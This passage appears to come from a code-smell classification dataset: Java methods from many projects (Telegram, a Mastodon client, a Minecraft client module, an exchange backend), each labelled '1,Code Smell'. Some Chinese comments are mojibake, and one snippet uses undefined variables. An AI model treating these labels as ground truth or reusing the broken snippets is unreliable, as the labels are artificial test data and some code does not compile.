 else {
    builder.setTitle(LocaleController.getString(""FilterRemoveExclusionTitle"",R.string.FilterRemoveExclusionTitle));
    if (object instanceof String) {
      builder.setMessage(LocaleController.formatString(""FilterRemoveExclusionText"",R.string.FilterRemoveExclusionText,name));
    }
 else     if (object instanceof TLRPC.User) {
      builder.setMessage(LocaleController.formatString(""FilterRemoveExclusionUserText"",R.string.FilterRemoveExclusionUserText,name));
    }
 else {
      builder.setMessage(LocaleController.formatString(""FilterRemoveExclusionChatText"",R.string.FilterRemoveExclusionChatText,name));
    }
  }
  builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
  builder.setPositiveButton(LocaleController.getString(""StickersRemove"",R.string.StickersRemove),(dialogInterface,i) -> {
    if (position == includeContactsRow) {
      newFilterFlags&=~MessagesController.DIALOG_FILTER_FLAG_CONTACTS;
    }
 else     if (position == includeNonContactsRow) {
      newFilterFlags&=~MessagesController.DIALOG_FILTER_FLAG_NON_CONTACTS;
    }
 else     if (position == includeGroupsRow) {
      newFilterFlags&=~MessagesController.DIALOG_FILTER_FLAG_GROUPS;
    }
 else     if (position == includeChannelsRow) {
      newFilterFlags&=~MessagesController.DIALOG_FILTER_FLAG_CHANNELS;
    }
 else     if (position == includeBotsRow) {
      newFilterFlags&=~MessagesController.DIALOG_FILTER_FLAG_BOTS;
    }
 else     if (position == excludeArchivedRow) {
      newFilterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_ARCHIVED;
    }
 else     if (position == excludeMutedRow) {
      newFilterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_MUTED;
    }
 else     if (position == excludeReadRow) {
      newFilterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_READ;
    }
 else {
      if (include) {
        newAlwaysShow.remove(position - includeStartRow);
      }
 else {
        newNeverShow.remove(position - excludeStartRow);
      }
    }
    fillFilterName();
    updateRows();
    checkDoneButton(true);
  }
);
  AlertDialog alertDialog=builder.create();
  showDialog(alertDialog);
  TextView button=(TextView)alertDialog.getButton(DialogInterface.BUTTON_POSITIVE);
  if (button != null) {
    button.setTextColor(Theme.getColor(Theme.key_dialogTextRed));
  }
}
",1,Code Smell
"@Override protected void doSolveForward(DataflowAnalysis<Node,Fact> analysis,DataflowResult<Node,Fact> result){
  CFG<Node> cfg=analysis.getCFG();
  NavigableSet<Node> workList=Sets.newOrderedSet(Comparator.comparingInt(cfg::getIndex));
  cfg.forEach(node -> {
    if (!cfg.isEntry(node)) {
      workList.add(node);
    }
  }
);
  while (!workList.isEmpty()) {
    Node node=workList.pollFirst();
    Fact in;
    int inDegree=cfg.getInDegreeOf(node);
    if (inDegree > 1) {
      in=result.getInFact(node);
      cfg.getInEdgesOf(node).forEach(inEdge -> {
        Fact fact=result.getOutFact(inEdge.source());
        if (analysis.needTransferEdge(inEdge)) {
          fact=analysis.transferEdge(inEdge,fact);
        }
        analysis.meetInto(fact,in);
      }
);
    }
 else     if (inDegree == 1) {
      CFGEdge<Node> inEdge=CollectionUtils.getOne(cfg.getInEdgesOf(node));
      if (analysis.needTransferEdge(inEdge)) {
        in=analysis.transferEdge(inEdge,result.getOutFact(inEdge.source()));
        result.setInFact(node,in);
      }
 else {
        in=result.getInFact(node);
      }
    }
 else {
      in=result.getInFact(node);
    }
    Fact out=result.getOutFact(node);
    boolean changed=analysis.transferNode(node,in,out);
    if (changed) {
      workList.addAll(cfg.getSuccsOf(node));
    }
  }
}",1,Code Smell
"private static float measureCorrectly(CharSequence text,TextPaint paint){
  if (text == null) {
    return 0;
  }
  if (!(text instanceof Spanned)) {
    return paint.measureText(text.toString());
  }
  Spanned spanned=(Spanned)text;
  TypefaceSpan[] spans=spanned.getSpans(0,text.length(),TypefaceSpan.class);
  AnimatedEmojiSpan[] animatedSpans=spanned.getSpans(0,text.length(),AnimatedEmojiSpan.class);
  Emoji.EmojiSpan[] emojiSpans=spanned.getSpans(0,text.length(),Emoji.EmojiSpan.class);
  int add=0;
  for (int i=0; i < emojiSpans.length; ++i) {
    add+=emojiSpans[i].size;
  }
  for (int i=0; i < animatedSpans.length; ++i) {
    add+=animatedSpans[i].size;
  }
  if (spans == null || spans.length == 0) {
    return paint.measureText(text.toString()) + add;
  }
  float len=0;
  int s=0, e;
  for (int i=0; i < spans.length; ++i) {
    int spanstart=spanned.getSpanStart(spans[i]);
    int spanend=spanned.getSpanEnd(spans[i]);
    e=Math.max(s,spanstart);
    if (e - s > 0) {
      len+=paint.measureText(spanned,s,e);
    }
    s=e;
    e=Math.max(s,spanend);
    if (e - s > 0) {
      Typeface oldTypeface=paint.getTypeface();
      paint.setTypeface(spans[i].getTypeface());
      len+=paint.measureText(spanned,s,e);
      paint.setTypeface(oldTypeface);
    }
    s=e;
  }
  e=Math.max(s,text.length());
  if (e - s > 0) {
    len+=paint.measureText(spanned,s,e);
  }
  return len + add;
}",1,Code Smell
"/** 
 * Communicate with tracker database to show information about tracking in a given app
 */
public void updateTrackerList(){
  new AsyncTask<Object,Object,List<TrackerCategory>>(){
    private boolean refreshing=true;
    @Override protected void onPreExecute(){
      if (swipeRefresh != null)       swipeRefresh.post(() -> {
        if (refreshing)         swipeRefresh.setRefreshing(true);
      }
);
    }
    @Override protected List<TrackerCategory> doInBackground(    Object... arg){
      Context c=getContext();
      if (c == null)       return null;
      return trackerList.getAppTrackers(c,mAppUid);
    }
    @Override protected void onPostExecute(    List<TrackerCategory> result){
      if (running) {
        if (adapter != null)         adapter.set(result);
        if (swipeRefresh != null) {
          refreshing=false;
          swipeRefresh.setRefreshing(false);
        }
        if (result != null && result.size() == 0)         suggestLaunchingApp();
      }
    }
  }
.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
}",1,Code Smell
"public void setCustomChatReactions(long chatId,int type,List<TLRPC.Reaction> reactions,int reactionsCount,Utilities.Callback<TLRPC.TL_error> onError,Runnable onSuccess){
  TLRPC.TL_messages_setChatAvailableReactions req=new TLRPC.TL_messages_setChatAvailableReactions();
  req.peer=getInputPeer(-chatId);
  if (type == ChatReactionsEditActivity.SELECT_TYPE_NONE || reactions.isEmpty()) {
    req.available_reactions=new TLRPC.TL_chatReactionsNone();
  }
 else   if (type == ChatReactionsEditActivity.SELECT_TYPE_ALL) {
    req.available_reactions=new TLRPC.TL_chatReactionsAll();
  }
 else {
    TLRPC.TL_chatReactionsSome someReactions=new TLRPC.TL_chatReactionsSome();
    req.available_reactions=someReactions;
    someReactions.reactions.addAll(reactions);
  }
  req.flags|=1;
  req.reactions_limit=reactionsCount;
  getConnectionsManager().sendRequest(req,(response,error) -> {
    if (response != null) {
      processUpdates((TLRPC.Updates)response,false);
      TLRPC.ChatFull full=getChatFull(chatId);
      if (full != null) {
        if (full instanceof TLRPC.TL_chatFull) {
          full.flags|=262144;
        }
        if (full instanceof TLRPC.TL_channelFull) {
          full.flags|=1073741824;
        }
        full.available_reactions=req.available_reactions;
        getMessagesStorage().updateChatInfo(full,false);
      }
      AndroidUtilities.runOnUIThread(() -> {
        if (onSuccess != null) {
          onSuccess.run();
        }
        getNotificationCenter().postNotificationName(NotificationCenter.chatAvailableReactionsUpdated,chatId,0L);
      }
);
    }
 else {
      AndroidUtilities.runOnUIThread(() -> {
        if (onError != null) {
          onError.run(error);
        }
      }
);
    }
  }
);
  TLRPC.ChatFull chatFull=getChatFull(chatId);
  if (chatFull != null) {
    if (chatFull instanceof TLRPC.TL_channelFull) {
      chatFull.flags2|=8192;
    }
 else {
      chatFull.flags|=1048576;
    }
    chatFull.reactions_limit=reactionsCount;
    getMessagesStorage().updateChatInfo(chatFull,false);
  }
}",1,Code Smell
"/** 
 * Similar to Java File API in Unix. <ul> <li>If destination is a file, it overrides it. <li>If destination is a directory, it overrides it only if it has no children. <li>If destination is does not exist, it creates it. </ul>
 */
public boolean renameTo(String source,String dest){
  if (dest.startsWith(source)) {
    return false;
  }
  if (!checkAccess(source,OsConstants.W_OK)) {
    return false;
  }
  boolean destExists=checkAccess(dest,OsConstants.F_OK);
  Node<?> sourceNode=getNode(source);
  if (sourceNode == null) {
    return false;
  }
  if (sourceNode.isDirectory()) {
    String filename=Paths.getLastPathSegment(dest);
    String parent=Paths.removeLastPathSegment(dest);
    mkdirs(parent);
    Node<?> targetNode=getNode(parent);
    if (targetNode == null) {
      return false;
    }
    if (destExists) {
      Node<?> node=getNode(filename);
      if (node != null) {
        if (node.isFile()) {
          return false;
        }
 else         if (node.listChildren() != null) {
          return false;
        }
 else {
          addAction(dest,new Action(ACTION_DELETE,node));
          targetNode.removeChild(node);
          invalidate(dest);
        }
      }
    }
    moveChildren(sourceNode,source,dest);
    Node<?> parentNode=sourceNode.getParent();
    if (parentNode != null) {
      parentNode.removeChild(sourceNode);
    }
    @SuppressWarnings({""unchecked"",""rawtypes""}) Node<?> renamedNode=new Node(targetNode,sourceNode,filename);
    Action action=new Action(ACTION_MOVE,renamedNode);
    action.setSourcePath(source);
    if (!dest.equals(renamedNode.getFullPath())) {
      throw new IllegalStateException(String.format(Locale.ROOT,""Invalid destination for the renamed node. Required: %s, was: %s"",dest,renamedNode.getFullPath()));
    }
    addAction(dest,action);
    targetNode.addChild(renamedNode);
    invalidate(source);
  }
 else   if (sourceNode.isFile()) {
    String filename=Paths.getLastPathSegment(dest);
    String parent=Paths.removeLastPathSegment(dest);
    mkdirs(parent);
    Node<?> targetNode=getNode(parent);
    if (targetNode == null) {
      return false;
    }
    if (destExists) {
      Node<?> destNode=getNode(filename);
      if (destNode != null) {
        if (destNode.isDirectory()) {
          return false;
        }
        addAction(dest,new Action(ACTION_DELETE,destNode));
        targetNode.removeChild(destNode);
        invalidate(dest);
      }
    }
    Node<?> parentNode=sourceNode.getParent();
    if (parentNode != null) {
      parentNode.removeChild(sourceNode);
    }
    @SuppressWarnings({""unchecked"",""rawtypes""}) Node<?> renamedNode=new Node(targetNode,sourceNode,filename);
    Action action=new Action(ACTION_MOVE,renamedNode);
    action.setSourcePath(source);
    if (!dest.equals(renamedNode.getFullPath())) {
      throw new IllegalStateException(String.format(Locale.ROOT,""Invalid destination for the renamed node. Required: %s, was: %s"",dest,renamedNode.getFullPath()));
    }
    addAction(dest,action);
    FileCacheItem cache=mFileCacheMap.remove(source);
    if (cache != null) {
      mFileCacheMap.put(dest,cache);
    }
    targetNode.addChild(renamedNode);
    invalidate(source);
  }
  return true;
}
",1,Code Smell
"/** 
 * Calls the setter method on the target object for the given property. If no setter method exists for the property, this method does nothing.
 * @param target The object to set the property on.
 * @param prop The property to set.
 * @param value The value to pass into the setter.
 * @throws SQLException if an error occurs setting the property.
 */
private void callSetter(Object target,PropertyDescriptor prop,Object value) throws SQLException {
  Method setter=prop.getWriteMethod();
  if (setter == null) {
    return;
  }
  Class<?>[] params=setter.getParameterTypes();
  try {
    if (value instanceof java.util.Date) {
      final String targetType=params[0].getName();
      if (""java.sql.Date"".equals(targetType)) {
        value=new java.sql.Date(((java.util.Date)value).getTime());
      }
 else       if (""java.sql.Time"".equals(targetType)) {
        value=new java.sql.Time(((java.util.Date)value).getTime());
      }
 else       if (""java.sql.Timestamp"".equals(targetType)) {
        Timestamp tsValue=(Timestamp)value;
        int nanos=tsValue.getNanos();
        value=new Timestamp(tsValue.getTime());
        ((Timestamp)value).setNanos(nanos);
      }
    }
 else     if (value instanceof String && params[0].isEnum()) {
      value=Enum.valueOf(params[0].asSubclass(Enum.class),(String)value);
    }
    if (this.isCompatibleType(value,params[0])) {
      setter.invoke(target,new Object[]{value});
    }
 else {
      throw new SQLException(""Cannot set "" + prop.getName() + "": incompatible types, cannot convert ""+ value.getClass().getName()+ "" to ""+ params[0].getName());
    }
  }
 catch (  IllegalArgumentException e) {
    throw new SQLException(""Cannot set "" + prop.getName() + "": ""+ e.getMessage());
  }
catch (  IllegalAccessException e) {
    throw new SQLException(""Cannot set "" + prop.getName() + "": ""+ e.getMessage());
  }
catch (  InvocationTargetException e) {
    throw new SQLException(""Cannot set "" + prop.getName() + "": ""+ e.getMessage());
  }
}",1,Code Smell
"private static RenameTargetResult getGtextureRenameTargets(String name,Root root){
  List<Identifier> gtextureTargets=new ArrayList<>();
  DeclarationExternalDeclaration samplerDeclaration=null;
  DeclarationMember samplerDeclarationMember=null;
  for (  Identifier id : root.identifierIndex.get(name)) {
    gtextureTargets.add(id);
    if (samplerDeclaration != null) {
      continue;
    }
    DeclarationExternalDeclaration externalDeclaration=(DeclarationExternalDeclaration)id.getAncestor(3,0,DeclarationExternalDeclaration.class::isInstance);
    if (externalDeclaration == null) {
      continue;
    }
    if (sampler.matchesExtract(externalDeclaration)) {
      boolean foundNameMatch=false;
      for (      DeclarationMember member : sampler.getNodeMatch(""name*"",DeclarationMember.class).getAncestor(TypeAndInitDeclaration.class).getMembers()) {
        if (member.getName().getName().equals(name)) {
          foundNameMatch=true;
        }
      }
      if (!foundNameMatch) {
        return null;
      }
      samplerDeclaration=externalDeclaration;
      samplerDeclarationMember=id.getAncestor(DeclarationMember.class);
      gtextureTargets.remove(gtextureTargets.size() - 1);
      continue;
    }
    return null;
  }
  if (samplerDeclaration == null) {
    return null;
  }
  return new RenameTargetResult(samplerDeclaration,samplerDeclarationMember,gtextureTargets.stream());
}",1,Code Smell
"public static void openURL(Context context,String accountID,String url,Object parentObject){
  String objectURL=null;
  if (parentObject instanceof Status) {
    objectURL=s.url;
  }
 else   if (parentObject instanceof Account) {
    objectURL=a.url;
  }
  Uri uri=Uri.parse(url);
  if (accountID != null && ""https"".equals(uri.getScheme()) && !Objects.equals(url,objectURL)) {
    List<String> path=uri.getPathSegments();
    if (AccountSessionManager.getInstance().getAccount(accountID).domain.equalsIgnoreCase(uri.getAuthority()) && path.size() == 2 && path.get(0).matches(""^@[a-zA-Z0-9_]+$"") && path.get(1).matches(""^[0-9]+$"")) {
      new GetStatusByID(path.get(1)).setCallback(new Callback<>(){
        @Override public void onSuccess(        Status result){
          Bundle args=new Bundle();
          args.putString(""account"",accountID);
          args.putParcelable(""status"",Parcels.wrap(result));
          Nav.go((Activity)context,ThreadFragment.class,args);
        }
        @Override public void onError(        ErrorResponse error){
          error.showToast(context);
          launchWebBrowser(context,url);
        }
      }
).wrapProgress((Activity)context,R.string.loading,true).exec(accountID);
      return;
    }
 else {
      new GetSearchResults(url,null,true,null,0,0).setCallback(new Callback<>(){
        @Override public void onSuccess(        SearchResults result){
          Bundle args=new Bundle();
          args.putString(""account"",accountID);
          if (result.statuses != null && !result.statuses.isEmpty()) {
            Status s=result.statuses.get(0);
            if (parentObject instanceof Status && s.id.equals(status.id)) {
              launchWebBrowser(context,url);
              return;
            }
            args.putParcelable(""status"",Parcels.wrap(s));
            Nav.go((Activity)context,ThreadFragment.class,args);
          }
 else           if (result.accounts != null && !result.accounts.isEmpty()) {
            Account a=result.accounts.get(0);
            if (parentObject instanceof Account && a.id.equals(account.id)) {
              launchWebBrowser(context,url);
              return;
            }
            args.putParcelable(""profileAccount"",Parcels.wrap(a));
            Nav.go((Activity)context,ProfileFragment.class,args);
          }
 else {
            launchWebBrowser(context,url);
          }
        }
        @Override public void onError(        ErrorResponse error){
          launchWebBrowser(context,url);
        }
      }
).wrapProgress((Activity)context,R.string.loading,true).exec(accountID);
      return;
    }
  }
  launchWebBrowser(context,url);
}",1,Code Smell
"/** 
 * 姣忓ぉ鍑屾櫒0鐐圭粺璁′笂涓�澶╂暟鎹�
 */
@Scheduled(cron=""0 0 0 * * ?"") public void statistics(){
  Date yesterday=DateUtil.getYesterday();
  Date startTime=DateUtil.getDateStartTime(yesterday);
  Date endTime=DateUtil.getDateEndTime(yesterday);
  int needAuthorNumber=10;
  int realAuthorNumber;
  Date maxAuthorCreateTime=new Date();
  do {
    List<Author> authors=authorService.queryAuthorList(needAuthorNumber,maxAuthorCreateTime);
    realAuthorNumber=authors.size();
    for (    Author author : authors) {
      maxAuthorCreateTime=author.getCreateTime();
      Long authorId=author.getId();
      Long userId=author.getUserId();
      List<Book> books=bookService.queryBookList(authorId);
      int buyTotalMember=0;
      int buyTotalCount=0;
      int buyTotalAccount=0;
      List<Long> bookIds=new ArrayList<>(books.size());
      for (      Book book : books) {
        Long bookId=book.getId();
        int buyMember=userService.queryBuyMember(bookId,startTime,endTime);
        int buyCount=0;
        int buyAccount=0;
        if (buyMember > 0) {
          buyCount=userService.queryBuyCount(bookId,startTime,endTime);
          buyAccount=userService.queryBuyAccount(bookId,startTime,endTime);
        }
        boolean isStatistics=authorService.queryIsStatisticsDaily(bookId,yesterday);
        if (!isStatistics) {
          AuthorIncomeDetail authorIncomeDetail=new AuthorIncomeDetail();
          authorIncomeDetail.setAuthorId(authorId);
          authorIncomeDetail.setUserId(userId);
          authorIncomeDetail.setBookId(bookId);
          authorIncomeDetail.setIncomeDate(yesterday);
          authorIncomeDetail.setIncomeNumber(buyMember);
          authorIncomeDetail.setIncomeCount(buyCount);
          authorIncomeDetail.setIncomeAccount(buyAccount);
          authorIncomeDetail.setCreateTime(new Date());
          authorService.saveDailyIncomeSta(authorIncomeDetail);
        }
        buyTotalCount+=buyCount;
        buyTotalAccount+=buyAccount;
        bookIds.add(bookId);
      }
      boolean isStatistics=authorService.queryIsStatisticsDaily(authorId,0L,yesterday);
      if (!isStatistics) {
        if (buyTotalCount > 0) {
          buyTotalMember=userService.queryBuyTotalMember(bookIds,startTime,endTime);
        }
        AuthorIncomeDetail authorIncomeAllDetail=new AuthorIncomeDetail();
        authorIncomeAllDetail.setAuthorId(authorId);
        authorIncomeAllDetail.setUserId(userId);
        authorIncomeAllDetail.setBookId(0L);
        authorIncomeAllDetail.setIncomeDate(yesterday);
        authorIncomeAllDetail.setIncomeNumber(buyTotalMember);
        authorIncomeAllDetail.setIncomeCount(buyTotalCount);
        authorIncomeAllDetail.setIncomeAccount(buyTotalAccount);
        authorIncomeAllDetail.setCreateTime(new Date());
        authorService.saveDailyIncomeSta(authorIncomeAllDetail);
      }
    }
  }
 while (needAuthorNumber == realAuthorNumber);
}",1,Code Smell
"@Override public void tick(){
  super.tick();
  if (movedContraption != null)   if (!movedContraption.isAlive())   movedContraption=null;
  if (isPassive())   return;
  if (level.isClientSide)   clientOffsetDiff*=.75f;
  if (waitingForSpeedChange) {
    if (movedContraption != null) {
      if (level.isClientSide) {
        float syncSpeed=clientOffsetDiff / 2f;
        offset+=syncSpeed;
        movedContraption.setContraptionMotion(toMotionVector(syncSpeed));
        return;
      }
      movedContraption.setContraptionMotion(Vec3.ZERO);
    }
    return;
  }
  if (!level.isClientSide && assembleNextTick) {
    assembleNextTick=false;
    if (running) {
      if (getSpeed() == 0)       tryDisassemble();
 else       sendData();
      return;
    }
 else {
      if (getSpeed() != 0)       try {
        assemble();
        lastException=null;
      }
 catch (      AssemblyException e) {
        lastException=e;
      }
      sendData();
    }
    return;
  }
  if (!running)   return;
  boolean contraptionPresent=movedContraption != null;
  if (needsContraption && !contraptionPresent)   return;
  float movementSpeed=getMovementSpeed();
  boolean locked=false;
  if (sequencedOffsetLimit > 0) {
    sequencedOffsetLimit=Math.max(0,sequencedOffsetLimit - Math.abs(movementSpeed));
    locked=sequencedOffsetLimit == 0;
  }
  float newOffset=offset + movementSpeed;
  if ((int)newOffset != (int)offset)   visitNewPosition();
  if (locked) {
    forceMove=true;
    resetContraptionToOffset();
    sendData();
  }
  if (contraptionPresent) {
    if (moveAndCollideContraption()) {
      movedContraption.setContraptionMotion(Vec3.ZERO);
      offset=getGridOffset(offset);
      resetContraptionToOffset();
      collided();
      return;
    }
  }
  if (!contraptionPresent || !movedContraption.isStalled())   offset=newOffset;
  int extensionRange=getExtensionRange();
  if (offset <= 0 || offset >= extensionRange) {
    offset=offset <= 0 ? 0 : extensionRange;
    if (!level.isClientSide) {
      moveAndCollideContraption();
      resetContraptionToOffset();
      tryDisassemble();
      if (waitingForSpeedChange) {
        forceMove=true;
        sendData();
      }
    }
    return;
  }
}",1,Code Smell
"/** 
 * 鍐欒褰曘��
 * @param dataExchange
 * @param cn
 * @param columns
 * @param rs
 * @param out
 * @param exportContext
 */
protected void writeRecords(SqlDataExport dataExchange,Connection cn,List<Column> columns,ResultSet rs,Writer out,IndexFormatDataExchangeContext exportContext) throws Throwable {
  TextDataExportListener listener=dataExchange.getListener();
  SqlDataExportOption exportOption=dataExchange.getExportOption();
  int columnCount=columns.size();
  DatabaseMetaData metaData=cn.getMetaData();
  String quote=metaData.getIdentifierQuoteString();
  String tableNameQuote=JdbcUtil.quoteIfNon(dataExchange.getTableName(),quote);
  if (exportOption.isExportCreationSql())   writeCreationSql(dataExchange,cn,columns,rs,quote,out,exportContext);
  long row=0;
  while (rs.next()) {
    exportContext.setDataIndex(RowDataIndex.valueOf(row));
    out.write(""INSERT INTO "");
    out.write(tableNameQuote);
    out.write("" ("");
    for (int i=0; i < columnCount; i++) {
      Column column=columns.get(i);
      if (i > 0)       out.write("","");
      out.write(JdbcUtil.quote(column.getName(),quote));
    }
    out.write("") VALUES("");
    for (int i=0; i < columnCount; i++) {
      Column column=columns.get(i);
      String value=null;
      try {
        value=getStringValue(cn,rs,column,exportContext.getDataFormatContext());
      }
 catch (      Throwable t) {
        if (exportOption.isNullForIllegalColumnValue()) {
          value=null;
          if (listener != null)           listener.onSetNullTextValue(exportContext.getDataIndex(),column.getName(),wrapToDataExchangeException(t));
        }
 else         throw t;
      }
      if (i > 0)       out.write("","");
      if (value == null) {
        out.write(""NULL"");
      }
 else       if (isSqlStringType(column.getType())) {
        out.write('\'');
        out.write(JdbcUtil.escapeString(value));
        out.write('\'');
      }
 else       out.write(value);
    }
    out.write("");"");
    out.write(LINE_SEPARATOR);
    if (listener != null)     listener.onSuccess(exportContext.getDataIndex());
    row++;
  }
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getScanner(Map<GroupArtifact,String> acc){
  final XPathMatcher PROJECT_MATCHER=new XPathMatcher(""/project"");
  final Pattern SEMVER_PATTERN=Pattern.compile(""(\\d+)\\.(\\d+)\\.(\\d+)\\.?(\\d+)?(-.+)?$"");
  return new MavenIsoVisitor<ExecutionContext>(){
    @Override public Xml.Tag visitTag(    Xml.Tag tag,    ExecutionContext ctx){
      Xml.Tag t=super.visitTag(tag,ctx);
      if (!PROJECT_MATCHER.matches(getCursor())) {
        return t;
      }
      ResolvedPom resolvedPom=getResolutionResult().getPom();
      if (!(matchesGlob(resolvedPom.getValue(t.getChildValue(""groupId"").orElse(null)),groupId) && matchesGlob(resolvedPom.getValue(t.getChildValue(""artifactId"").orElse(null)),artifactId))) {
        return t;
      }
      Optional<Xml.Tag> versionTag=t.getChild(""version"");
      if (!(versionTag.isPresent() && versionTag.get().getValue().isPresent())) {
        return t;
      }
      String versionTagValue=versionTag.get().getValue().get();
      String oldVersion=resolvedPom.getValue(versionTagValue);
      if (oldVersion == null) {
        return t;
      }
      String newVersion=incrementSemverDigit(oldVersion);
      if (newVersion.equals(oldVersion)) {
        return t;
      }
      acc.put(new GroupArtifact(t.getChildValue(""groupId"").orElse(null),t.getChildValue(""artifactId"").orElse(null)),newVersion);
      return t;
    }
    private String incrementSemverDigit(    String oldVersion){
      Matcher m=SEMVER_PATTERN.matcher(oldVersion);
      if (!m.matches()) {
        return oldVersion;
      }
      String major=m.group(1);
      String minor=m.group(2);
      String patch=m.group(3);
      String fourth=m.group(4);
      String extra=m.group(5);
switch (digit) {
case MAJOR:
        major=String.valueOf(Integer.parseInt(major) + 1);
      minor=""0"";
    patch=""0"";
  break;
case MINOR:
minor=String.valueOf(Integer.parseInt(minor) + 1);
patch=""0"";
break;
case PATCH:
patch=String.valueOf(Integer.parseInt(patch) + 1);
break;
}
if (fourth == null) {
fourth="""";
}
 else {
fourth="".0"";
}
if (extra == null) {
extra="""";
}
return major + ""."" + minor+ "".""+ patch+ fourth+ extra;
}
}
;
}",1,Code Smell
"private float getLiquidCornerHeight(int x,int z){
  int ix, iz;
  for (ix=x; ix <= x + 1; ix++) {
    for (iz=z; iz <= z + 1; iz++) {
      if (isSameLiquid(block.getNeighborBlock(ix,1,iz))) {
        return 16f;
      }
    }
  }
  float sumHeight=0f;
  int count=0;
  ExtendedBlock neighbor;
  BlockState neighborBlockState;
  for (ix=x; ix <= x + 1; ix++) {
    for (iz=z; iz <= z + 1; iz++) {
      neighbor=block.getNeighborBlock(ix,0,iz);
      neighborBlockState=neighbor.getBlockState();
      if (isSameLiquid(neighbor)) {
        if (neighborBlockState.getLiquidLevel() == 0)         return 14f;
        sumHeight+=getLiquidBaseHeight(neighborBlockState);
        count++;
      }
 else       if (!isLiquidBlockingBlock(neighborBlockState)) {
        count++;
      }
    }
  }
  if (sumHeight == 0)   return 3f;
  if (count == 0)   return 3f;
  return sumHeight / count;
}",1,Code Smell
"@EventHandler private void onTick(TickEvent.Post event){
  if (mc.world.getDimension().bedWorks()) {
    error(""You can't blow up beds in this dimension, disabling."");
    toggle();
    return;
  }
  if (PlayerUtils.shouldPause(pauseOnMine.get(),pauseOnEat.get(),pauseOnDrink.get()))   return;
  target=TargetUtils.getPlayerTarget(targetRange.get(),priority.get());
  if (target == null) {
    placePos=null;
    breakPos=null;
    return;
  }
  if (autoMove.get()) {
    FindItemResult bed=InvUtils.find(itemStack -> itemStack.getItem() instanceof BedItem);
    if (bed.found() && bed.slot() != autoMoveSlot.get() - 1) {
      InvUtils.move().from(bed.slot()).toHotbar(autoMoveSlot.get() - 1);
    }
  }
  if (breakPos == null) {
    placePos=findPlace(target);
  }
  if (timer <= 0 && placeBed(placePos)) {
    timer=delay.get();
  }
 else {
    timer--;
  }
  if (breakPos == null)   breakPos=findBreak();
  breakBed(breakPos);
}",1,Code Smell
"/** 
 * 璁㈠崟璇︽儏
 * @param orderSn
 * @param user
 * @return
 */
@RequestMapping(value=""detail"") public MessageResult queryOrder(String orderSn,@SessionAttribute(SESSION_MEMBER) AuthMember user){
  Order order=orderService.findOneByOrderSn(orderSn);
  notNull(order,msService.getMessage(""ORDER_NOT_EXISTS""));
  MessageResult result=MessageResult.success();
  Member member=memberService.findOne(order.getMemberId());
  OrderDetail info=OrderDetail.builder().orderSn(orderSn).unit(order.getCoin().getUnit()).status(order.getStatus()).amount(order.getNumber()).price(order.getPrice()).money(order.getMoney()).payTime(order.getPayTime()).createTime(order.getCreateTime()).timeLimit(order.getTimeLimit()).myId(user.getId()).memberMobile(member.getMobilePhone()).build();
  PayInfo payInfo=PayInfo.builder().bankInfo(order.getBankInfo()).alipay(order.getAlipay()).wechatPay(order.getWechatPay()).build();
  info.setPayInfo(payInfo);
  if (order.getMemberId().equals(user.getId())) {
    info.setHisId(order.getCustomerId());
    info.setOtherSide(order.getCustomerName());
    info.setCommission(order.getCommission());
    Member memberCustomer=memberService.findOne(order.getCustomerId());
    info.setMemberMobile(memberCustomer.getMobilePhone());
    if (order.getAdvertiseType().equals(AdvertiseType.BUY)) {
      info.setType(AdvertiseType.BUY);
      if (info.getPayInfo() != null) {
        info.getPayInfo().setRealName(order.getCustomerRealName());
      }
    }
 else {
      info.setType(AdvertiseType.SELL);
      if (info.getPayInfo() != null) {
        info.getPayInfo().setRealName(order.getMemberRealName());
      }
    }
  }
 else   if (order.getCustomerId().equals(user.getId())) {
    info.setHisId(order.getMemberId());
    info.setOtherSide(order.getMemberName());
    info.setCommission(BigDecimal.ZERO);
    Member memberOrder=memberService.findOne(order.getMemberId());
    info.setMemberMobile(memberOrder.getMobilePhone());
    if (order.getAdvertiseType().equals(AdvertiseType.BUY)) {
      if (info.getPayInfo() != null) {
        info.getPayInfo().setRealName(order.getCustomerRealName());
      }
      info.setType(AdvertiseType.SELL);
    }
 else {
      if (info.getPayInfo() != null) {
        info.getPayInfo().setRealName(order.getMemberRealName());
      }
      info.setType(AdvertiseType.BUY);
    }
  }
 else {
    return MessageResult.error(msService.getMessage(""ORDER_NOT_EXISTS""));
  }
  result.setData(info);
  return result;
}
",1,Code Smell
"@Override protected void service(HttpServletRequest req,HttpServletResponse resp) throws IOException {
  String path=req.getServletPath();
  ServerEndpoint serverEndpoint=ServerEndpoint.forPath(path);
  if (serverEndpoint != null) {
    AbstractHttpServerTest.controller(serverEndpoint,() -> {
      if (serverEndpoint == ServerEndpoint.EXCEPTION) {
        throw new IllegalStateException(serverEndpoint.getBody());
      }
      if (serverEndpoint == ServerEndpoint.CAPTURE_HEADERS) {
        resp.setHeader(""X-Test-Response"",req.getHeader(""X-Test-Request""));
      }
      if (serverEndpoint == ServerEndpoint.CAPTURE_PARAMETERS) {
        req.setCharacterEncoding(""UTF8"");
        String value=req.getParameter(""test-parameter"");
        if (!""test value õäöü"".equals(value)) {
          throw new IllegalStateException(""request parameter does not have expected value "" + value);
        }
      }
      if (serverEndpoint == ServerEndpoint.INDEXED_CHILD) {
        ServerEndpoint.INDEXED_CHILD.collectSpanAttributes(req::getParameter);
      }
      resp.getWriter().print(serverEndpoint.getBody());
      if (serverEndpoint == ServerEndpoint.REDIRECT) {
        resp.sendRedirect(serverEndpoint.getBody());
      }
 else       if (serverEndpoint == ServerEndpoint.ERROR) {
        resp.sendError(serverEndpoint.getStatus(),serverEndpoint.getBody());
      }
 else {
        resp.setStatus(serverEndpoint.getStatus());
      }
      return null;
    }
);
  }
 else {
    resp.getWriter().println(""No cookie for you: "" + path);
    resp.setStatus(400);
  }
}",1,Code Smell
"@PreAuthorize(""hasAuthority('ucenter-UcenterController-countAddLogs')"") @Override @RequestMapping(value=""countAddLogs"",method=RequestMethod.GET) public ResponseResult countAddLogs(CfCountUserQuery cfCountUserQuery){
  if (cfCountUserQuery.getDate().equals("""") || cfCountUserQuery.getDate().equals(""null"")) {
    cfCountUserQuery.setDate(null);
  }
  if (cfCountUserQuery.getEndDate().equals("""") || cfCountUserQuery.getEndDate().equals(""null"")) {
